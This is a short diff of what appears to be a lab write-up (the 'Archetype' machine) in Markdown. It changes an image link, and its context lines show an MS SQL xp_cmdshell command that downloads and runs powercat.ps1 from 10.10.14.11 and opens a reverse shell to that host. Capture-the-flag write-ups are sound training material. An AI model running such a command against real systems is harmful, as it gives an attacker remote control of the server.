@@ -48,4 +48,4 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp
 EXEC xp_cmdshell 'powershell -c "IEX (New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.11:8000/powercat.ps1\");powercat -c 10.10.14.11 -p 4444 -e powershell"';
 ```
 
-![](assets/images/posts/2025-03-06-Archetype/9c5ab89e51a73bef43ca35e9513680a4_MD5.jpeg)
+![](assets/images/posts/2025-03-06-Archetype/9c5ab89e51a73bef43ca35e9513680a4_MD5.jpeg)![](assets/images/posts/2025-03-06-Archetype/ddd88b5c3111a3ccd4219434fe508f7a_MD5.jpeg)
